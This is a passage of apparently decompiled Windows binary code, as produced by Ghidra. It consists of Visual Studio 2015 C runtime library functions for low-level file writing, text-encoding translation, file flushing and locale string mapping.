  }
  return -1;
}



void FUN_0040d467(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + -0x20));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_61cee617f5178ae960314fd4d05640a0>,class <lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class
// <lambda_9cd88cf8ad10232537feb2133f08c833>>(class
// <lambda_61cee617f5178ae960314fd4d05640a0>&&,class
// <lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class <lambda_9cd88cf8ad10232537feb2133f08c833>&&)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_seh_guarded_call<int>::
operator___class__lambda_61cee617f5178ae960314fd4d05640a0__class__lambda_6978c1fb23f02e42e1d9e99668cc68aa___class__lambda_9cd88cf8ad10232537feb2133f08c833___
          (__crt_seh_guarded_call_int_ *this,_lambda_61cee617f5178ae960314fd4d05640a0_ *param_1,
          _lambda_6978c1fb23f02e42e1d9e99668cc68aa_ *param_2,
          _lambda_9cd88cf8ad10232537feb2133f08c833_ *param_3)

{
  uint _FileHandle;
  HANDLE hFile;
  BOOL BVar1;
  ulong *puVar2;
  DWORD DVar3;
  int *piVar4;
  int iVar5;
  
  iVar5 = 0;
  ___acrt_lowio_lock_fh(*(uint *)param_1);
  _FileHandle = **(uint **)param_2;
  if ((*(byte *)((&DAT_0041bfc8)[(int)_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3f) * 0x30) & 1)
      != 0) {
    hFile = (HANDLE)__get_osfhandle(_FileHandle);
    BVar1 = FlushFileBuffers(hFile);
    if (BVar1 != 0) goto LAB_0040d4e1;
    puVar2 = ___doserrno();
    DVar3 = GetLastError();
    *puVar2 = DVar3;
  }
  piVar4 = __errno();
  *piVar4 = 9;
  iVar5 = -1;
LAB_0040d4e1:
  FUN_0040d4fd();
  return iVar5;
}



void FUN_0040d4fd(void)

{
  int unaff_EBP;
  
  ___acrt_lowio_unlock_fh(**(uint **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  int __cdecl __acrt_lowio_lock_fh_and_call<class
// <lambda_6978c1fb23f02e42e1d9e99668cc68aa>>(int,class <lambda_6978c1fb23f02e42e1d9e99668cc68aa>&&)
// 
// Library: Visual Studio 2015 Release

int __cdecl
__acrt_lowio_lock_fh_and_call_class__lambda_6978c1fb23f02e42e1d9e99668cc68aa___
          (int param_1,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ *param_2)

{
  int iVar1;
  int local_10;
  int local_c;
  __crt_seh_guarded_call_int_ local_5;
  
  local_c = param_1;
  local_10 = param_1;
  iVar1 = __crt_seh_guarded_call<int>::
          operator___class__lambda_61cee617f5178ae960314fd4d05640a0__class__lambda_6978c1fb23f02e42e1d9e99668cc68aa___class__lambda_9cd88cf8ad10232537feb2133f08c833___
                    (&local_5,(_lambda_61cee617f5178ae960314fd4d05640a0_ *)&local_10,param_2,
                     (_lambda_9cd88cf8ad10232537feb2133f08c833_ *)&local_c);
  return iVar1;
}



// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2015 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  int iVar2;
  int *local_8;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if (((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041c1c8)) &&
       ((*(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + (_FileHandle & 0x3fU) * 0x30) & 1) !=
        0)) {
      local_8 = &_FileHandle;
      iVar2 = __acrt_lowio_lock_fh_and_call_class__lambda_6978c1fb23f02e42e1d9e99668cc68aa___
                        (_FileHandle,(_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ *)&local_8);
      return iVar2;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004091be();
  }
  return -1;
}



// Library Function - Single Match
//  struct `anonymous namespace'::write_result __cdecl write_double_translated_ansi_nolock(int,char
// const * const,unsigned int)
// 
// Library: Visual Studio 2015 Release

write_result __cdecl write_double_translated_ansi_nolock(int param_1,char *param_2,uint param_3)

{
  byte bVar1;
  HANDLE hFile;
  write_result wVar2;
  byte *pbVar3;
  UINT CodePage;
  ushort *puVar4;
  int iVar5;
  uint uVar6;
  BOOL BVar7;
  DWORD DVar8;
  int iVar9;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int extraout_EDX_02;
  int extraout_EDX_03;
  int extraout_EDX_04;
  int extraout_EDX_05;
  int iVar10;
  int iVar11;
  byte *pbVar12;
  int in_stack_00000010;
  byte *_SrcCh;
  size_t _SrcSizeInBytes;
  uint local_24;
  undefined2 local_20;
  wchar_t local_1c [2];
  CHAR local_18 [8];
  byte local_10;
  undefined local_f;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  iVar9 = (int)param_2 >> 6;
  iVar11 = ((uint)param_2 & 0x3f) * 0x30;
  hFile = *(HANDLE *)((&DAT_0041bfc8)[iVar9] + 0x18 + iVar11);
  pbVar3 = (byte *)(in_stack_00000010 + param_3);
  CodePage = GetConsoleCP();
  *(undefined4 *)param_1 = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  iVar10 = extraout_EDX;
  pbVar12 = (byte *)param_3;
  if (param_3 < pbVar3) {
    do {
      local_1c[0] = L'\0';
      local_20 = local_20 & 0xff | (ushort)*pbVar12 << 8;
      iVar10 = (&DAT_0041bfc8)[iVar9];
      bVar1 = *(byte *)(iVar10 + 0x2d + iVar11);
      if ((bVar1 & 4) == 0) {
        puVar4 = ___pctype_func();
        if ((puVar4[*pbVar12] & 0x8000) == 0) {
          _SrcSizeInBytes = 1;
          _SrcCh = pbVar12;
          goto LAB_0040d674;
        }
        if (pbVar3 <= pbVar12) {
          *(byte *)((&DAT_0041bfc8)[iVar9] + 0x2e + iVar11) = *pbVar12;
          pbVar12 = (byte *)((&DAT_0041bfc8)[iVar9] + 0x2d + iVar11);
          *pbVar12 = *pbVar12 | 4;
          *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 1;
          iVar10 = iVar9;
          break;
        }
        iVar5 = _mbtowc(local_1c,(char *)pbVar12,2);
        iVar10 = extraout_EDX_00;
        if (iVar5 == -1) break;
        pbVar12 = pbVar12 + 1;
      }
      else {
        local_10 = *(byte *)(iVar10 + 0x2e + iVar11);
        uVar6 = CONCAT11(*pbVar12,bVar1) & 0xfffffffb;
        _SrcSizeInBytes = 2;
        local_f = (undefined)(uVar6 >> 8);
        *(char *)(iVar10 + 0x2d + iVar11) = (char)uVar6;
        _SrcCh = &local_10;
LAB_0040d674:
        iVar5 = _mbtowc(local_1c,(char *)_SrcCh,_SrcSizeInBytes);
        iVar10 = extraout_EDX_01;
        if (iVar5 == -1) break;
      }
      pbVar12 = pbVar12 + 1;
      uVar6 = WideCharToMultiByte(CodePage,0,local_1c,1,local_18,5,(LPCSTR)0x0,(LPBOOL)0x0);
      iVar10 = extraout_EDX_02;
      if (uVar6 == 0) break;
      BVar7 = WriteFile(hFile,local_18,uVar6,&local_24,(LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_0040d738:
        DVar8 = GetLastError();
        *(DWORD *)param_1 = DVar8;
        iVar10 = extraout_EDX_05;
        break;
      }
      *(byte **)(param_1 + 4) = pbVar12 + (*(int *)(param_1 + 8) - param_3);
      iVar10 = extraout_EDX_03;
      if (local_24 < uVar6) break;
      iVar10 = extraout_EDX_03;
      if (local_20._1_1_ == '\n') {
        local_20 = 0xd;
        BVar7 = WriteFile(hFile,&local_20,1,&local_24,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_0040d738;
        iVar10 = extraout_EDX_04;
        if (local_24 == 0) break;
        *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
        *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 1;
        iVar10 = extraout_EDX_04;
      }
    } while (pbVar12 < pbVar3);
  }
  wVar2 = (write_result)FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,(char)iVar10,(char)CodePage);
  return wVar2;
}



// Library Function - Single Match
//  struct `anonymous namespace'::write_result __cdecl write_double_translated_unicode_nolock(char
// const * const,unsigned int)
// 
// Library: Visual Studio 2015 Release

write_result __cdecl write_double_translated_unicode_nolock(char *param_1,uint param_2)

{
  wchar_t _WCh;
  wchar_t wVar1;
  wint_t wVar2;
  wchar_t *pwVar3;
  DWORD DVar4;
  int in_stack_0000000c;
  
  *(undefined4 *)param_1 = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  pwVar3 = (wchar_t *)(in_stack_0000000c + param_2);
  if (param_2 < pwVar3) {
    do {
      _WCh = *(wchar_t *)param_2;
      wVar1 = __putwch_nolock(_WCh);
      if (wVar1 != _WCh) {
LAB_0040d7af:
        DVar4 = GetLastError();
        *(DWORD *)param_1 = DVar4;
        break;
      }
      *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 2;
      if (_WCh == L'\n') {
        wVar2 = __putwch_nolock(L'\r');
        if (wVar2 != 0xd) goto LAB_0040d7af;
        *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 1;
        *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
      }
      param_2 = param_2 + 2;
    } while (param_2 < pwVar3);
  }
  return SUB41(param_1,0);
}



// Library Function - Single Match
//  bool __cdecl write_requires_double_translation_nolock(int)
// 
// Library: Visual Studio 2015 Release

bool __cdecl write_requires_double_translation_nolock(int param_1)

{
  int iVar1;
  __acrt_ptd *p_Var2;
  BOOL BVar3;
  int iVar4;
  bool bVar5;
  DWORD local_8;
  
  iVar1 = __isatty(param_1);
  if (iVar1 == 0) {
    bVar5 = false;
  }
  else {
    iVar4 = param_1 >> 6;
    iVar1 = (param_1 & 0x3fU) * 0x30;
    if (((*(byte *)((&DAT_0041bfc8)[iVar4] + 0x28 + iVar1) & 0x80) == 0) ||
       ((p_Var2 = ___acrt_getptd(), *(int *)(*(int *)(p_Var2 + 0x4c) + 0xa8) == 0 &&
        (*(char *)((&DAT_0041bfc8)[iVar4] + 0x29 + iVar1) == '\0')))) {
      bVar5 = false;
    }
    else {
      BVar3 = GetConsoleMode(*(HANDLE *)((&DAT_0041bfc8)[iVar4] + 0x18 + iVar1),&local_8);
      bVar5 = BVar3 != 0;
    }
  }
  return bVar5;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  struct `anonymous namespace'::write_result __cdecl write_text_ansi_nolock(int,char const *
// const,unsigned int)
// 
// Library: Visual Studio 2015 Release

write_result __cdecl write_text_ansi_nolock(int param_1,char *param_2,uint param_3)

{
  char cVar1;
  write_result wVar2;
  BOOL BVar3;
  DWORD DVar4;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  char *pcVar5;
  int in_stack_00000010;
  HANDLE hFile;
  uint local_1410;
  char *local_140c;
  char local_1408 [5120];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  hFile = *(HANDLE *)((&DAT_0041bfc8)[(int)param_2 >> 6] + 0x18 + ((uint)param_2 & 0x3f) * 0x30);
  *(undefined4 *)param_1 = 0;
  local_140c = (char *)(in_stack_00000010 + param_3);
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  do {
    if (local_140c <= param_3) break;
    pcVar5 = local_1408;
    do {
      if (local_140c <= param_3) break;
      cVar1 = *(char *)param_3;
      param_3 = param_3 + 1;
      if (cVar1 == '\n') {
        *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 1;
        *pcVar5 = '\r';
        pcVar5 = pcVar5 + 1;
      }
      *pcVar5 = cVar1;
      pcVar5 = pcVar5 + 1;
    } while (pcVar5 < local_1408 + 0x13ff);
    BVar3 = WriteFile(hFile,local_1408,(int)pcVar5 - (int)local_1408,&local_1410,(LPOVERLAPPED)0x0);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      *(DWORD *)param_1 = DVar4;
      in_DL = extraout_DL_00;
      break;
    }
    *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + local_1410;
    in_DL = extraout_DL;
  } while ((uint)((int)pcVar5 - (int)local_1408) <= local_1410);
  wVar2 = (write_result)FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,in_DL,(char)hFile);
  return wVar2;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  struct `anonymous namespace'::write_result __cdecl write_text_utf16le_nolock(int,char const *
// const,unsigned int)
// 
// Library: Visual Studio 2015 Release

write_result __cdecl write_text_utf16le_nolock(int param_1,char *param_2,uint param_3)

{
  short sVar1;
  write_result wVar2;
  BOOL BVar3;
  DWORD DVar4;
  undefined uVar5;
  undefined extraout_DL;
  undefined4 uVar6;
  undefined4 extraout_EDX;
  short *psVar7;
  int in_stack_00000010;
  HANDLE hFile;
  uint local_1410;
  short *local_140c;
  short local_1408 [2560];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  hFile = *(HANDLE *)((&DAT_0041bfc8)[(int)param_2 >> 6] + 0x18 + ((uint)param_2 & 0x3f) * 0x30);
  local_140c = (short *)(in_stack_00000010 + param_3);
  uVar6 = 0;
  *(undefined4 *)param_1 = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  do {
    uVar5 = (undefined)uVar6;
    if (local_140c <= param_3) break;
    psVar7 = local_1408;
    do {
      if (local_140c <= param_3) break;
      sVar1 = *(short *)param_3;
      param_3 = param_3 + 2;
      if (sVar1 == 10) {
        *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + 2;
        *psVar7 = 0xd;
        psVar7 = psVar7 + 1;
      }
      *psVar7 = sVar1;
      psVar7 = psVar7 + 1;
    } while (psVar7 < local_1408 + 0x9ff);
    BVar3 = WriteFile(hFile,local_1408,(int)psVar7 - (int)local_1408,&local_1410,(LPOVERLAPPED)0x0);
    uVar5 = (undefined)extraout_EDX;
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      *(DWORD *)param_1 = DVar4;
      uVar5 = extraout_DL;
      break;
    }
    *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + local_1410;
    uVar6 = extraout_EDX;
  } while ((uint)((int)psVar7 - (int)local_1408) <= local_1410);
  wVar2 = (write_result)FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar5,(char)hFile);
  return wVar2;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  struct `anonymous namespace'::write_result __cdecl write_text_utf8_nolock(int,char const *
// const,unsigned int)
// 
// Library: Visual Studio 2015 Release

write_result __cdecl write_text_utf8_nolock(int param_1,char *param_2,uint param_3)

{
  WCHAR WVar1;
  HANDLE hFile;
  write_result wVar2;
  WCHAR *pWVar3;
  BOOL BVar4;
  DWORD DVar5;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  uint uVar6;
  WCHAR *pWVar7;
  int in_stack_00000010;
  uint in_stack_ffffebe4;
  DWORD local_1414;
  WCHAR *local_1410;
  CHAR local_140c [3416];
  WCHAR local_6b4 [854];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  hFile = *(HANDLE *)((&DAT_0041bfc8)[(int)param_2 >> 6] + 0x18 + ((uint)param_2 & 0x3f) * 0x30);
  local_1410 = (WCHAR *)(in_stack_00000010 + param_3);
  *(undefined4 *)param_1 = 0;
  *(undefined4 *)(param_1 + 4) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  pWVar7 = (WCHAR *)param_3;
  if (param_3 < local_1410) {
    do {
      uVar6 = 0;
      pWVar3 = local_6b4;
      do {
        if (local_1410 <= pWVar7) break;
        WVar1 = *pWVar7;
        pWVar7 = pWVar7 + 1;
        if (WVar1 == L'\n') {
          *pWVar3 = L'\r';
          pWVar3 = pWVar3 + 1;
        }
        *pWVar3 = WVar1;
        pWVar3 = pWVar3 + 1;
      } while (pWVar3 < local_6b4 + 0x354);
      in_stack_ffffebe4 =
           WideCharToMultiByte(0xfde9,0,local_6b4,(int)pWVar3 - (int)local_6b4 >> 1,local_140c,0xd55
                               ,(LPCSTR)0x0,(LPBOOL)0x0);
      if (in_stack_ffffebe4 == 0) {
LAB_0040db15:
        DVar5 = GetLastError();
        *(DWORD *)param_1 = DVar5;
        in_DL = extraout_DL_00;
        break;
      }
      do {
        BVar4 = WriteFile(hFile,local_140c + uVar6,in_stack_ffffebe4 - uVar6,&local_1414,
                          (LPOVERLAPPED)0x0);
        if (BVar4 == 0) goto LAB_0040db15;
        uVar6 = uVar6 + local_1414;
      } while (uVar6 < in_stack_ffffebe4);
      *(uint *)(param_1 + 4) = (int)pWVar7 - param_3;
      in_DL = extraout_DL;
    } while (pWVar7 < local_1410);
  }
  wVar2 = (write_result)FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,in_DL,(char)in_stack_ffffebe4)
  ;
  return wVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __write
// 
// Library: Visual Studio 2015 Release

int __cdecl __write(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_0041c1c8)) {
      iVar3 = (_FileHandle & 0x3fU) * 0x30;
      if ((*(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + iVar3) & 1) != 0) {
        ___acrt_lowio_lock_fh(_FileHandle);
        iVar4 = -1;
        if ((*(byte *)((&DAT_0041bfc8)[_FileHandle >> 6] + 0x28 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
        }
        else {
          iVar4 = __write_nolock(_FileHandle,_Buf,_MaxCharCount);
        }
        FUN_0040dbf2();
        return iVar4;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004091be();
  }
  return -1;
}



void FUN_0040dbf2(void)

{
  uint unaff_ESI;
  
  ___acrt_lowio_unlock_fh(unaff_ESI);
  return;
}



// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2015 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  ulong uVar1;
  char cVar2;
  bool bVar3;
  write_result wVar4;
  ulong *puVar5;
  int *piVar6;
  undefined3 extraout_var;
  undefined3 extraout_var_00;
  undefined3 extraout_var_01;
  undefined3 extraout_var_02;
  undefined3 extraout_var_03;
  BOOL BVar7;
  int iVar8;
  undefined in_DL;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined extraout_DL_10;
  undefined extraout_DL_11;
  int iVar9;
  char *pcVar10;
  DWORD local_18;
  DWORD local_14;
  undefined4 local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  local_c = _MaxCharCount;
  pcVar10 = (char *)_Buf;
  if (_MaxCharCount == 0) goto LAB_0040de17;
  if (_Buf == (void *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004091be();
    in_DL = extraout_DL;
    pcVar10 = (char *)_Buf;
    goto LAB_0040de17;
  }
  iVar9 = _FileHandle >> 6;
  iVar8 = (_FileHandle & 0x3fU) * 0x30;
  cVar2 = *(char *)((&DAT_0041bfc8)[iVar9] + 0x29 + iVar8);
  if (((cVar2 == '\x02') || (cVar2 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_004091be();
    in_DL = extraout_DL_00;
    pcVar10 = (char *)_Buf;
    goto LAB_0040de17;
  }
  if ((*(byte *)((&DAT_0041bfc8)[iVar9] + 0x28 + iVar8) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0,2);
  }
  bVar3 = write_requires_double_translation_nolock(_FileHandle);
  in_DL = extraout_DL_01;
  if (bVar3) {
    if (cVar2 == '\0') {
      wVar4 = write_double_translated_ansi_nolock((int)&local_18,(char *)_FileHandle,(uint)_Buf);
      puVar5 = (ulong *)CONCAT31(extraout_var_00,wVar4);
      in_DL = extraout_DL_03;
      _Buf = pcVar10;
      goto LAB_0040dda3;
    }
    if ((byte)(cVar2 - 1U) < 2) {
      wVar4 = write_double_translated_unicode_nolock((char *)&local_18,(uint)_Buf);
      puVar5 = (ulong *)CONCAT31(extraout_var,wVar4);
      in_DL = extraout_DL_02;
      _Buf = pcVar10;
      goto LAB_0040dda3;
    }
  }
  else {
    if ((*(byte *)((&DAT_0041bfc8)[iVar9] + 0x28 + iVar8) & 0x80) == 0) {
      local_18 = 0;
      local_14 = 0;
      local_10 = 0;
      BVar7 = WriteFile(*(HANDLE *)((&DAT_0041bfc8)[iVar9] + 0x18 + iVar8),_Buf,local_c,&local_14,
                        (LPOVERLAPPED)0x0);
      in_DL = extraout_DL_07;
      if (BVar7 == 0) {
        local_18 = GetLastError();
        in_DL = extraout_DL_08;
      }
      puVar5 = &local_18;
      _Buf = pcVar10;
    }
    else if (cVar2 == '\0') {
      wVar4 = write_text_ansi_nolock((int)&local_18,(char *)_FileHandle,(uint)_Buf);
      puVar5 = (ulong *)CONCAT31(extraout_var_03,wVar4);
      in_DL = extraout_DL_06;
      _Buf = pcVar10;
    }
    else if (cVar2 == '\x01') {
      wVar4 = write_text_utf8_nolock((int)&local_18,(char *)_FileHandle,(uint)_Buf);
      puVar5 = (ulong *)CONCAT31(extraout_var_02,wVar4);
      in_DL = extraout_DL_05;
      _Buf = pcVar10;
    }
    else {
      if (cVar2 != '\x02') goto LAB_0040ddde;
      wVar4 = write_text_utf16le_nolock((int)&local_18,(char *)_FileHandle,(uint)_Buf);
      puVar5 = (ulong *)CONCAT31(extraout_var_01,wVar4);
      in_DL = extraout_DL_04;
      _Buf = pcVar10;
    }
LAB_0040dda3:
    uVar1 = *puVar5;
    pcVar10 = (char *)_Buf;
    if (puVar5[1] != 0) goto LAB_0040de17;
    if (uVar1 != 0) {
      if (uVar1 == 5) {
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
        in_DL = extraout_DL_09;
        pcVar10 = (char *)_Buf;
      }
      else {
        ___acrt_errno_map_os_error(uVar1);
        in_DL = extraout_DL_10;
        pcVar10 = (char *)_Buf;
      }
      goto LAB_0040de17;
    }
  }
LAB_0040ddde:
                    // WARNING: Load size is inaccurate
  if (((*(byte *)((&DAT_0041bfc8)[iVar9] + 0x28 + iVar8) & 0x40) == 0) || (*_Buf != '\x1a')) {
    piVar6 = __errno();
    *piVar6 = 0x1c;
    puVar5 = ___doserrno();
    *puVar5 = 0;
    in_DL = extraout_DL_11;
  }
LAB_0040de17:
  iVar8 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,in_DL,(char)pcVar10);
  return iVar8;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2015 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14;
  int *local_10;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,(__crt_locale_pointers *)_Locale);
  uVar1 = *(ushort *)(*local_10 + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __acrt_LCMapStringA_stat(struct __crt_locale_pointers *,wchar_t const *,unsigned
// long,char const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2015 Release

int __cdecl
__acrt_LCMapStringA_stat
          (__crt_locale_pointers *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar7;
  undefined4 *lpWideCharStr;
  undefined4 *puVar8;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  iVar4 = param_5;
  if (0 < param_5) {
    iVar3 = ___strncnt(param_4,param_5);
    iVar4 = iVar3 + 1;
    if (param_5 <= iVar3) {
      iVar4 = iVar3;
    }
  }
  if (param_8 == 0) {
    param_8 = *(int *)(*(int *)param_1 + 8);
  }
  iVar3 = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,iVar4,(LPWSTR)0x0,0);
  uVar7 = extraout_DL;
  if (iVar3 == 0) goto LAB_0040e058;
  uVar1 = iVar3 * 2;
  if ((uVar1 + 8 & -(uint)(uVar1 < uVar1 + 8)) == 0) {
    lpWideCharStr = (undefined4 *)0x0;
    iVar6 = iVar3;
LAB_0040df2d:
    iVar3 = iVar6;
    if (((lpWideCharStr != (undefined4 *)0x0) &&
        (iVar4 = MultiByteToWideChar(param_8,1,param_4,iVar4,(LPWSTR)lpWideCharStr,iVar6),
        iVar3 = iVar6, iVar4 != 0)) &&
       (iVar4 = ___acrt_LCMapStringEx_36
                          (param_2,param_3,(LPCWSTR)lpWideCharStr,iVar6,(LPWSTR)0x0,0,0,0,0),
       iVar4 != 0)) {
      if ((param_3 & 0x400) == 0) {
        uVar1 = iVar4 * 2;
        if ((uVar1 + 8 & -(uint)(uVar1 < uVar1 + 8)) == 0) {
          puVar5 = (undefined4 *)0x0;
LAB_0040e00a:
          if ((puVar5 != (undefined4 *)0x0) &&
             (iVar6 = ___acrt_LCMapStringEx_36
                                (param_2,param_3,(LPCWSTR)lpWideCharStr,iVar3,(LPWSTR)puVar5,iVar4,0
                                 ,0,0), iVar6 != 0)) {
            if (param_7 == 0) {
              param_7 = 0;
              param_6 = (LPSTR)0x0;
            }
            iVar4 = WideCharToMultiByte(param_8,0,(LPCWSTR)puVar5,iVar4,param_6,param_7,(LPCSTR)0x0,
                                        (LPBOOL)0x0);
            if (iVar4 != 0) {
              __freea_crt((int)puVar5);
              goto LAB_0040e04f;
            }
          }
        }
        else if ((-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8) < 0x401) {
          puVar8 = (undefined4 *)&stack0xffffffe8;
          puVar5 = (undefined4 *)&stack0xffffffe8;
          if (&stack0x00000000 != (undefined *)0x18) {
LAB_0040e003:
            puVar5 = puVar8 + 2;
            goto LAB_0040e00a;
          }
        }
        else {
          puVar5 = (undefined4 *)__malloc_base(-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8);
          if (puVar5 != (undefined4 *)0x0) {
            *puVar5 = 0xdddd;
            puVar8 = puVar5;
            goto LAB_0040e003;
          }
        }
        __freea_crt((int)puVar5);
      }
      else if ((param_7 != 0) && (iVar4 <= param_7)) {
        ___acrt_LCMapStringEx_36
                  (param_2,param_3,(LPCWSTR)lpWideCharStr,iVar6,(LPWSTR)param_6,param_7,0,0,0);
      }
    }
  }
  else if ((-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8) < 0x401) {
    puVar5 = (undefined4 *)&stack0xffffffe8;
    lpWideCharStr = (undefined4 *)&stack0xffffffe8;
    if (&stack0x00000000 != (undefined *)0x18) {
LAB_0040df26:
      lpWideCharStr = puVar5 + 2;
      iVar6 = iVar3;
      goto LAB_0040df2d;
    }
  }
  else {
    puVar5 = (undefined4 *)__malloc_base(-(uint)(uVar1 < uVar1 + 8) & uVar1 + 8);
    lpWideCharStr = puVar5;
    if (puVar5 != (undefined4 *)0x0) {
      *puVar5 = 0xdddd;
      goto LAB_0040df26;
    }
  }
LAB_0040e04f:
  __freea_crt((int)lpWideCharStr);
  uVar7 = extraout_DL_00;
LAB_0040e058:
  iVar4 = FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,uVar7,(char)iVar3);
  return iVar4;
}



// Library Function - Single Match
//  ___acrt_LCMapStringA
// 
// Library: Visual Studio 2015 Release

void __cdecl
___acrt_LCMapStringA
          (__crt_locale_pointers *param_1,wchar_t *param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  int local_14;
  __crt_locale_pointers local_10 [8];
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_1);
  __acrt_LCMapStringA_stat(local_10,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9)
  ;
  if (local_8 != '\0') {
    *(uint *)(local_14 + 0x350) = *(uint *)(local_14 + 0x350) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  ___acrt_fp_strflt_to_string
// 
// Library: Visual Studio 2015 Release

int __cdecl ___acrt_fp_strflt_to_string(char *param_1,uint param_2,int param_3,int param_4)

{
